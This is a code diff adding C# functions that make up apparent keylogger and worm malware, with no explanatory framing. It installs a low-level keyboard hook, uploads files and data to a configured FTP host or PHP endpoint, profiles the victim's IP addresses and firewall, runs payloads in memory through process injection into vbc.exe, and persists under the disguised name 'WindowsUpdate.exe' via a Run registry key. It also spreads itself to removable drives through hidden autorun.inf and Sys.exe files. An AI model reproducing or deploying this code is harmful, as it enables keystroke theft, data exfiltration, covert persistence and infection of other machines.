@@ -1,0 +1,333 @@
+public void UploadFTP(string Filename)
+{
+	FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create("ftp://" + this.ftphost + "/" + Path.GetFileName(Filename));
+	ftpWebRequest.Credentials = new NetworkCredential(this.ftpuser, this.ftppass);
+	ftpWebRequest.Method = "STOR";
+	byte[] array = File.ReadAllBytes(Filename);
+	Stream requestStream = ftpWebRequest.GetRequestStream();
+	requestStream.Write(array, 0, array.Length);
+	requestStream.Close();
+	requestStream.Dispose();
+}
+public void UploadFTP(string Filename, string Data)
+{
+	FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create("ftp://" + this.ftphost + "/" + Filename);
+	ftpWebRequest.Credentials = new NetworkCredential(this.ftpuser, this.ftppass);
+	ftpWebRequest.Method = "STOR";
+	Stream requestStream = ftpWebRequest.GetRequestStream();
+	BinaryWriter binaryWriter = new BinaryWriter(requestStream);
+	try
+	{
+		binaryWriter.Write(Data);
+	}
+	finally
+	{
+		bool flag = binaryWriter != null;
+		if (flag)
+		{
+			((IDisposable)binaryWriter).Dispose();
+		}
+	}
+	requestStream.Close();
+	requestStream.Dispose();
+}
+public void UploadPHP(string Filename, string Data)
+{
+	WebClient webClient = new WebClient();
+	webClient.DownloadString(string.Concat(new string[]
+	{
+		this.phplink,
+		"?fname=",
+		Filename,
+		"&data=",
+		Data
+	}));
+}
+private void WaitUntilFileIsAvailable(string Filename)
+{
+	bool flag = false;
+	while (!File.Exists(Filename) | !flag)
+	{
+		try
+		{
+			FileStream fileStream = File.OpenRead(Filename);
+			fileStream.Close();
+			flag = true;
+		}
+		catch (Exception ex)
+		{
+		}
+		Application.DoEvents();
+	}
+}
+
+public string GetExternalIP()
+{
+	return this.GetBetween(new WebClient().DownloadString("http://whatismyipaddress.com/"), "<!-- do not script -->", "<!-- do not script -->").Replace("&#46;", ".").Trim();
+}
+public string GetBetween(string Source, string Before, string After)
+{
+	checked
+	{
+		int num = Source.IndexOf(Before, 0) + Before.Length;
+		bool flag = num - Before.Length == -1;
+		string result;
+		if (flag)
+		{
+			result = string.Empty;
+		}
+		else
+		{
+			int num2 = Source.IndexOf(After, num);
+			flag = (num2 == -1);
+			if (flag)
+			{
+				result = string.Empty;
+			}
+			else
+			{
+				result = Source.Substring(num, num2 - num);
+			}
+		}
+		return result;
+	}
+}
+public string GetFirewall()
+{
+	string result;
+	try
+	{
+		string text = null;
+		ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("\\\\" + Environment.MachineName + "\\root\\SecurityCenter2", "SELECT * FROM FirewallProduct");
+		ManagementObjectCollection managementObjectCollection = managementObjectSearcher.Get();
+		try
+		{
+			foreach (ManagementBaseObject managementBaseObject in managementObjectCollection)
+			{
+				ManagementObject managementObject = (ManagementObject)managementBaseObject;
+				text = managementObject["displayName"].ToString();
+			}
+		}
+		finally
+		{
+			ManagementObjectCollection.ManagementObjectEnumerator enumerator;
+			bool flag = enumerator != null;
+			if (flag)
+			{
+				((IDisposable)enumerator).Dispose();
+			}
+		}
+		result = text;
+	}
+	catch (Exception ex)
+	{
+	}
+	return result;
+}
+public string GetInternalIP()
+{
+	foreach (IPAddress ipaddress in Dns.GetHostEntry(Dns.GetHostName()).AddressList)
+	{
+		bool flag = ipaddress.AddressFamily == AddressFamily.InterNetwork;
+		if (flag)
+		{
+			return ipaddress.ToString();
+		}
+	}
+	return null;
+}
+
+private object Hooked()
+{
+	object result;
+	try
+	{
+		result = (this.KeyboardHandle != (IntPtr)0);
+	}
+	catch (Exception ex)
+	{
+		result = "";
+	}
+	return result;
+}
+public void HookKeyboard()
+{
+	try
+	{
+		this.callback = new Form1.KeyboardHookDelegate(this.KeyboardCallback);
+		this.KeyboardHandle = (IntPtr)Form1.SetWindowsHookEx(13, this.callback, (int)Process.GetCurrentProcess().MainModule.BaseAddress, 0);
+		bool flag = this.KeyboardHandle != (IntPtr)0;
+		if (flag)
+		{
+		}
+	}
+	catch (Exception ex)
+	{
+	}
+}
+
+public void run(byte[] run)
+{
+	object instance = Assembly.Load(this.mem).CreateInstance("CMemoryExecute");
+	Type type = null;
+	string memberName = "Run";
+	object[] array = new object[]
+	{
+		run,
+		"C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\vbc.exe"
+	};
+	object[] arguments = array;
+	string[] argumentNames = null;
+	Type[] typeArguments = null;
+	bool[] array2 = new bool[]
+	{
+		true,
+		false
+	};
+	object obj = NewLateBinding.LateGet(instance, type, memberName, arguments, argumentNames, typeArguments, array2);
+	if (array2[0])
+	{
+		run = (byte[])Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(byte[]));
+	}
+	Assembly assembly = (Assembly)obj;
+}
+
+public bool IsConnectedToInternet()
+{
+	NetworkInterface[] allNetworkInterfaces = NetworkInterface.GetAllNetworkInterfaces();
+	foreach (NetworkInterface networkInterface in allNetworkInterfaces)
+	{
+		bool flag = networkInterface.NetworkInterfaceType != NetworkInterfaceType.Loopback && networkInterface.OperationalStatus == OperationalStatus.Up;
+		if (flag)
+		{
+			return true;
+		}
+	}
+	return false;
+}
+private string readweb(string url)
+{
+	try
+	{
+		WebClient webClient = new WebClient();
+		Stream stream = webClient.OpenRead(url);
+		StreamReader streamReader = new StreamReader(stream);
+		return streamReader.ReadToEnd();
+	}
+	catch (Exception ex)
+	{
+	}
+	return null;
+}
+
+private object IsDotNet(byte[] Bytes)
+{
+	object result;
+	try
+	{
+		MethodInfo entryPoint = Assembly.Load(Bytes).EntryPoint;
+		result = true;
+	}
+	catch (Exception ex)
+	{
+		result = false;
+	}
+	return result;
+}
+
+public string DecompressString(string compressedText)
+{
+	checked
+	{
+		try
+		{
+			byte[] array = Convert.FromBase64String(compressedText);
+			MemoryStream memoryStream = new MemoryStream();
+			try
+			{
+				int num = BitConverter.ToInt32(array, 0);
+				memoryStream.Write(array, 4, array.Length - 4);
+				byte[] array2 = new byte[num - 1 + 1];
+				memoryStream.Position = 0L;
+				GZipStream gzipStream = new GZipStream(memoryStream, CompressionMode.Decompress);
+				try
+				{
+					gzipStream.Read(array2, 0, array2.Length);
+				}
+				finally
+				{
+					bool flag = gzipStream != null;
+					if (flag)
+					{
+						((IDisposable)gzipStream).Dispose();
+					}
+				}
+				return Encoding.UTF8.GetString(array2);
+			}
+			finally
+			{
+				bool flag = memoryStream != null;
+				if (flag)
+				{
+					((IDisposable)memoryStream).Dispose();
+				}
+			}
+		}
+		catch (Exception ex)
+		{
+		}
+		return null;
+	}
+}
+
+public void addtostartup()
+{
+	bool flag = !File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\WindowsUpdate.exe");
+	if (flag)
+	{
+		FileSystem.FileCopy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\WindowsUpdate.exe");
+		RegistryKey currentUser = Registry.CurrentUser;
+		RegistryKey registryKey = currentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
+		registryKey.SetValue("Windows Update", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\WindowsUpdate.exe", RegistryValueKind.String);
+	}
+}
+
+public void Spread()
+{
+	for (;;)
+	{
+		foreach (DriveInfo driveInfo in DriveInfo.GetDrives())
+		{
+			try
+			{
+				bool flag = driveInfo.DriveType == DriveType.Removable;
+				if (flag)
+				{
+					StreamWriter streamWriter = new StreamWriter(driveInfo.Name + "autorun.inf");
+					try
+					{
+						streamWriter.WriteLine("[autorun]");
+						streamWriter.WriteLine("open=Sys.exe");
+						streamWriter.WriteLine("action=Run win32");
+						streamWriter.Close();
+					}
+					finally
+					{
+						flag = (streamWriter != null);
+						if (flag)
+						{
+							((IDisposable)streamWriter).Dispose();
+						}
+					}
+					File.Copy(Application.ExecutablePath, driveInfo.Name + "Sys.exe", true);
+					File.SetAttributes(driveInfo.Name + "autorun.inf", FileAttributes.ReadOnly | FileAttributes.Hidden | FileAttributes.System);
+					File.SetAttributes(driveInfo.Name + "Sys.exe", FileAttributes.ReadOnly | FileAttributes.Hidden | FileAttributes.System);
+				}
+			}
+			catch (Exception ex)
+			{
+			}
+		}
+		Thread.Sleep(5000);
+	}
+}
